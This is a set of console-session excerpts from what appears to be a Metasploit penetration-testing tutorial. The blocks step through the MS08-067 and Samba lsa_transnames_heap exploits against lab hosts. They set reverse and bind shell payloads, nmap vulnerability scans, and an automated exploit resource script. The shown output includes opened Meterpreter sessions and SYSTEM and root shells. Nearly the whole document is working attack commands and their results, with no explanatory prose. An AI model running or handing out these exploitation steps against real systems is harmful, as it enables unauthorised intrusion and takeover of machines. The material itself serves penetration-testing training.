["```\nmsf > `use windows/smb/ms08_067_netapi`\nmsf exploit(ms08_067_netapi) > `back`\nmsf >\n```", "```\nmsf > `search mssql`\n[*] Searching loaded modules for pattern 'mssql'...\n\nAuxiliary\n=========\n\n   Name                       Disclosure Date  Rank    Description\n   ----                       ---------------  ----    -----------\n   admin/mssql/mssql_enum                      normal\n  Microsoft SQL Server Configuration\n                                                         Enumerator\n   admin/mssql/mssql_exec                      normal\n  Microsoft SQL Server xp_cmdshell\n                                                         Command Execution\n   admin/mssql/mssql_idf                       normal\n  Microsoft SQL Server - Interesting\n                                                         Data Finder\n   admin/mssql/mssql_sql                       normal\n  Microsoft SQL Server Generic Query\n   scanner/mssql/mssql_login                   normal  MSSQL Login Utility\n   scanner/mssql/mssql_ping                    normal  MSSQL Ping Utility\nExploits\n\n`. . . SNIP . . .`\n\nmsf >\n```", "```\nmsf > `search ms08_067`\n[*] Searching loaded modules for pattern 'ms08_067'...\n\nExploits\n========\n\n   Name                         Rank   Description\n   ----                         ----   -----------\n   `windows/smb/ms08_067_netapi`\n  great  Microsoft Server Service Relative Path Stack Corruption\n```", "```\nmsf > `use windows/smb/ms08_067_netapi`\nmsf exploit(ms08_067_netapi) >\n```", "```\nmsf exploit(ms08_067_netapi) >\n```", "```\nmsf exploit(ms08_067_netapi) > `show options`\n\nModule options:\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST                     yes       The target address\n   RPORT    445              yes       Set the SMB service port\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n\nmsf exploit(ms08_067_netapi) >\n```", "```\nmsf> `show payloads`\n```", "```\nmsf exploit(ms08_067_netapi) > `show payloads`\n\nCompatible Payloads\n===================\n\nName                                             Rank    Description\n----                                             ----    -----------\n\n`. . . SNIP . . .`\n\nwindows/shell/reverse_ipv6_tcp                   normal\n  Windows Command Shell, Reverse TCP\n                                                           Stager (IPv6)\nwindows/shell/reverse_nonx_tcp                   normal\n  Windows Command Shell, Reverse TCP\n                                                           Stager (No NX or Win7)\nwindows/shell/reverse_ord_tcp                    normal\n  Windows Command Shell, Reverse\n\n                                                 Ordinal TCP Stager (No NX or Win7)\nwindows/shell/reverse_tcp                        normal\n  Windows Command Shell, Reverse TCP\n                                                           Stager\nwindows/shell/reverse_tcp_allports               normal\n  Windows Command Shell, Reverse\n                                                           All-Port TCP Stager\nwindows/shell_bind_tcp                           normal\n  Windows Command Shell, Bind TCP\n                                                           Inline\nwindows/shell_reverse_tcp                        normal\n  Windows Command Shell, Reverse TCP\n                                                           Inline\n```", "```\nmsf exploit(ms08_067_netapi) > `set payload windows/shell/reverse_tcp` \n  payload => windows/shell/reverse_tcp\n  msf exploit(ms08_067_netapi) > `show options` \n\n  Module options:\n\n     Name     Current Setting  Required  Description\n     ----     ---------------  --------  -----------\n     RHOST                     yes       The target address\n     RPORT    445              yes       Set the SMB service port\n     SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\n   Payload options (windows/shell/reverse_tcp):\n\n     Name      Current Setting  Required  Description\n     ----      ---------------  --------  -----------\n     EXITFUNC  thread           yes       Exit technique: seh, thread, process\n     LHOST                      yes       The local address\n     LPORT     4444             yes       The local port\n```", "```\nmsf exploit(ms08_067_netapi) > `show targets`\n\n  Exploit targets:\n\n     Id  Name\n   --  ----\n    0   Automatic Targeting\n     1   Windows 2000 Universal\n     2   Windows XP SP0/SP1 Universal\n     3   Windows XP SP2 English (NX)\n     4   Windows XP SP3 English (NX)\n     5   Windows 2003 SP0 Universal\n     6   Windows 2003 SP1 English (NO NX)\n     7   Windows 2003 SP1 English (NX)\n     8   Windows 2003 SP2 English (NO NX)\n     9   Windows 2003 SP2 English (NX)\n```", "```\nmsf exploit(ms08_067_netapi) > `info`\n```", "```\nmsf exploit(ms08_067_netapi) > `set RHOST 192.168.1.155` \nRHOST => 192.168.1.155\nmsf exploit(ms08_067_netapi) > `set TARGET 3` \nTARGET => 3\nmsf exploit(ms08_067_netapi) > `show options` \n\nModule options:\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST    192.168.1.155    yes       The target address\n   RPORT    445              yes       Set the SMB service port\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   3   Windows XP SP2 English (NX)\n\nmsf exploit(ms08_067_netapi) > unset RHOST\nUnsetting RHOST...\n```", "```\nmsf exploit(ms08_067_netapi) > `save`\nSaved configuration to: /root/.msf3/config\nmsf exploit(ms08_067_netapi) >\n```", "```\nroot@bt:/root# `cd /opt/framework3/msf3/`\nroot@bt:/opt/framework3/msf3# `msfconsole`\n\n`. . . SNIP . . .`\n\nmsf > `nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130` \n[*] exec: nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130\n\nStarting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:46 EDT\nWarning: Traceroute does not support idle or connect scan, disabling...\nNSE: Script Scanning completed.\nNmap scan report for 192.168.33.130\nHost is up (0.00050s latency).\nNot shown: 991 closed ports\nPORT     STATE SERVICE      VERSION\n21/tcp   open  ftp          Microsoft ftpd\n25/tcp   open  smtp         Microsoft ESMTP 6.0.2600.2180\n80/tcp   open  http         Microsoft IIS webserver 5.1\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn\n443/tcp  open  https?\n445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds\n1025/tcp open  msrpc        Microsoft Windows RPC\n1433/tcp open  ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM\nMAC Address: 00:0C:29:EA:26:7C (VMware)\nDevice type: general purpose\nRunning: Microsoft Windows XP|2003\nOS details: `Microsoft Windows XP Professional SP2 or Windows Server 2003` \nNetwork Distance: 1 hop\nService Info: Host: ihazsecurity; OS: Windows\n\nHost script results:\n smb-check-vulns:\n   `MS08-067: VULNERABLE` \n   Conficker: Likely CLEAN\n   regsvc DoS: CHECK DISABLED (add '--script-args=unsafe=1' to run)\n   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)\n\nOS and Service detection performed. Please report any incorrect\n results at http://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 71.67 seconds\nmsf >\n```", "```\nmsf > `search ms08_067_netapi` \n[*] Searching loaded modules for pattern 'ms08_067_netapi'...\n\nExploits\n========\n\n   Name                         Rank   Description\n   ----                         ----   -----------\n   windows/smb/ms08_067_netapi  great  Microsoft Server\n Service Relative Path Stack Corruption\n\nmsf > `use windows/smb/ms08_067_netapi` \nmsf exploit(ms08_067_netapi) > `set PAYLOAD windows/meterpreter/reverse_tcp` \npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms08_067_netapi) > `show targets` \n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n   1   Windows 2000 Universal\n   2   Windows XP SP0/SP1 Universal\n   `3   Windows XP SP2 English (NX)` \n   4   Windows XP SP3 English (NX)\n   5   Windows 2003 SP0 Universal\n   6   Windows 2003 SP1 English (NO NX)\n   7   Windows 2003 SP1 English (NX)\n   8   Windows 2003 SP2 English (NO NX)\n   9   Windows 2003 SP2 English (NX)\n\n`. . . SNIP . . .`\n\n   26  Windows XP SP2 Japanese (NX)\n\n`. . . SNIP . . .`\n\nmsf exploit(ms08_067_netapi) > `set TARGET 3`\ntarget => 3\nmsf exploit(ms08_067_netapi) > `set RHOST 192.168.33.130` \nRHOST => 192.168.33.130\nmsf exploit(ms08_067_netapi) > `set LHOST 192.168.33.129` \nLHOST => 192.168.33.129\nmsf exploit(ms08_067_netapi) > `set LPORT 8080` \nLPORT => 8080\nmsf exploit(ms08_067_netapi) > `show options` \n\nModule options:\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST    192.168.33.130   yes       The target address\n   RPORT    445              yes       Set the SMB service port\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique: seh, thread, process\n   LHOST     192.168.33.129   yes       The local address\n   LPORT     8080             yes       The local port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   3   Windows XP SP2 English (NX)\n```", "```\nmsf exploit(ms08_067_netapi) > `exploit` \n[*] Started reverse handler on 192.168.33.129:8080\n[*] Triggering the vulnerability...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1487) \nmsf exploit(ms08_067_netapi) > `sessions -l` \n\nActive sessions\n===============\n\n  Id  Type         Information  Connection\n  --  ----         -----------  ----------\n  1   meterpreter               192.168.33.129:8080 -> 192.168.33.130:1036 \n\nmsf exploit(ms08_067_netapi) > `sessions -i 1` \n[*] Starting interaction with 1...\n\nmeterpreter > `shell` \nProcess 4060 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32>\n```", "```\nmsf > `nmap -sT -A -P0 192.168.33.132`\n[*] exec: nmap -sT -A -P0 192.168.33.132\n\nStarting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:35 EDT\nWarning: Traceroute does not support idle or connect scan, disabling...\nNmap scan report for 192.168.33.132\nHost is up (0.00048s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE     VERSION\n`80/tcp  open`  http        Apache httpd 2.2.3 ((`Ubuntu`) PHP/5.2.1) \n|_html-title: Index of /\n`139/tcp open`  netbios-ssn `Samba` smbd 3.X (workgroup: MSHOME) \n`445/tcp open`  netbios-ssn `Samba` smbd 3.X (workgroup: MSHOME)\nMAC Address: 00:0C:29:21:AD:08 (VMware)\nNo exact OS matches for host (If you know what OS is running\n on it, see http://nmap.org/submit/ ).\n\n`. . . SNIP . . .`\n\nHost script results:\n|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>\n|_smbv2-enabled: Server doesn't support SMBv2 protocol\n| smb-os-discovery:\n|   OS: Unix (Samba 3.0.24)\n|   Name: MSHOME\\Unknown\n|_  System time: 2011-03-15 17:39:57 UTC-4\n\nOS and Service detection performed. Please report any incorrect\n results at http://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 47.11 seconds\n```", "```\nmsf > `search samba`\n[*] Searching loaded modules for pattern 'samba'...\n\nAuxiliary\n=========\n   Name                               Rank    Description\n   ----                               ----    -----------\n   admin/smb/samba_symlink_traversal  normal  Samba Symlink Directory Traversal\n   dos/samba/lsa_addprivs_heap        normal  Samba lsa_io_privilege_set Heap Overflow\n   dos/samba/lsa_transnames_heap      normal  Samba lsa_io_trans_names Heap `Overflow`\n\nExploits\n========\n\n   Name                                 Rank       Description\n   ----                                 ----       -----------\n   `linux/samba/lsa_transnames_heap      good       Samba lsa_io_trans_names . . .`\n\n`. . . SNIP . . .`\n\nmsf > `use linux/samba/lsa_transnames_heap`\nmsf exploit(lsa_transnames_heap) > `show payloads`\nCompatible Payloads\n===================\n\n   Name                              Rank    Description\n   ----                              ----    -----------\n   generic/debug_trap                normal  Generic x86 Debug Trap\n   generic/shell_bind_tcp            normal  Generic Command Shell, Bind TCP Inline\n   generic/shell_reverse_tcp         normal  Generic Command Shell, Reverse TCP Inline\n   linux/x86/adduser                 normal  Linux Add User\n   linux/x86/chmod                   normal  Linux Chmod\n   linux/x86/exec                    normal  Linux Execute Command\n   linux/x86/metsvc_bind_tcp         normal  Linux Meterpreter Service, Bind TCP\n   linux/x86/metsvc_reverse_tcp      normal  Linux Meterpreter\n Service, Reverse TCP Inline\n   linux/x86/shell/bind_ipv6_tcp     normal  Linux Command Shell,\n Bind TCP Stager (IPv6)\n   linux/x86/shell/bind_tcp          normal  Linux Command Shell, Bind TCP Stager\n\n`. . . SNIP . . .`\n\nmsf exploit(lsa_transnames_heap) > `set payload linux/x86/shell_bind_tcp`\npayload => linux/x86/shell_bind_tcp\nmsf exploit(lsa_transnames_heap) > `set LPORT 8080`\nLPORT => 8080\nmsf exploit(lsa_transnames_heap) > `set RHOST 192.168.33.132`\nRHOST => 192.168.33.132\nmsf exploit(lsa_transnames_heap) > `exploit`\n\n[*] Creating nop sled....\n[*] Started bind handler\n[*] Trying to exploit Samba with address 0xffffe410...\n[*] Connecting to the SMB service...\n\n`. . . SNIP . . .`\n\n[*] Calling the vulnerable function...\n[+] Server did not respond, this is expected\n[*] Command shell session 1 opened (192.168.33.129:41551 -> 192.168.33.132:8080)\n`ifconfig`\neth1      Link encap:Ethernet  HWaddr 00:0C:29:21:AD:08\n          inet addr:192.168.33.132  Bcast:192.168.33.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:3178 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:2756 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:292351 (285.4 KiB)  TX bytes:214234 (209.2 KiB)\n          Interrupt:17 Base address:0x2000\n\nlo        Link encap:Local Loopback\n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0\n          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)\n\n`whoami`\nroot\n```", "```\nmsf > `use windows/smb/ms08_067_netapi`\nmsf exploit(ms08_067_netapi) > `set LHOST 192.168.33.129`\nlhost => 192.168.33.129\nsmsf exploit(ms08_067_netapi) > `set RHOST 192.168.33.130`\nrhost => 192.168.33.130\nmsf exploit(ms08_067_netapi) > `set TARGET 3`\ntarget => 3\nmsf exploit(ms08_067_netapi) > `search ports`\n[*] Searching loaded modules for pattern 'ports'...\n\nCompatible Payloads\n===================\n\n   Name                                       Rank    Description\n   ----                                       ----    -----------\n   windows/dllinject/reverse_tcp_allports     normal  Reflective Dll Injection,\n                                                        Reverse All-Port TCP Stager\n   windows/meterpreter/reverse_tcp_allports   normal  Windows Meterpreter (Reflective\n\n       Injection), Reverse All-Port TCP Stager\n\n`. . . SNIP . . .`\n\nmsf exploit(ms08_067_netapi) > `set PAYLOAD windows/meterpreter/reverse_tcp_allports`\npayload => windows/meterpreter/reverse_tcp_allports\nmsf exploit(ms08_067_netapi) > `exploit -j`\n[*] Exploit running as background job.\nmsf exploit(ms08_067_netapi) >\n[*] Started reverse handler on 192.168.33.129:1 \n[*] Triggering the vulnerability...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:1 -> 192.168.33.130:1047) \n\nmsf exploit(ms08_067_netapi) > `sessions -l -v`\n\nActive sessions\n===============\n\n  Id  Type         Information\n                Connection                               Via\n  --  ----         -----------\n                        ----------                               ---\n  1   meterpreter  NT AUTHORITY\\SYSTEM @ IHAZSECURITY  192.\n168.33.129:1 -> 192.168.33.130:1047\n\n    exploit/windows/smb/ms08_067_netapi\n\nmsf exploit(ms08_067_netapi) > `sessions -i 1`\n[*] Starting interaction with 1...\n\nmeterpreter >\n```", "```\nroot@bt:/opt/framework3/msf3/ `echo version > resource.rc` \n  root@bt:/opt/framework3/msf3/ `echo load sounds >> resource.rc` \n  root@bt:/opt/framework3/msf3/ `msfconsole -r resource.rc` \n resource (resource.rc)> version\n  Framework: 3.7.0-dev.12220\n  Console  : 3.7.0-dev.12220\n  resource (resource.rc)> load sounds\n  [*] Successfully loaded plugin: sounds\n  msf >\n```", "```\nroot@bt:/opt/framework3/msf3/\n`echo use exploit/windows/smb/ms08_067_netapi > autoexploit.rc`\nroot@bt:/opt/framework3/msf3/ `echo set RHOST 192.168.1.155 >> autoexploit.rc`\nroot@bt:/opt/framework3/msf3/\n `echo set PAYLOAD windows/meterpreter/reverse_tcp >> autoexploit.rc`\nroot@bt:/opt/framework3/msf3/ `echo set LHOST 192.168.1.101 >> autoexploit.rc`\nroot@bt:/opt/framework3/msf3/ `echo exploit >> autoexploit.rc`\nroot@bt:/opt/framework3/msf3/ `msfconsole`\nmsf > `resource autoexploit.rc`\nresource (autoexploit.rc)> use exploit/windows/smb/ms08_067_netapi\nresource (autoexploit.rc)> set RHOST 192.168.1.155\nRHOST => 192.168.1.155\nresource (autoexploit.rc)> set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nresource (autoexploit.rc)> set LHOST 192.168.1.101\nLHOST => 192.168.1.101\nresource (autoexploit.rc)> exploit\n\n[*] Started reverse handler on 192.168.1.101:4444\n[*] Triggering the vulnerability...\n[*] Sending stage (747008 bytes)\n[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1033)\n\nmeterpreter >\n```"]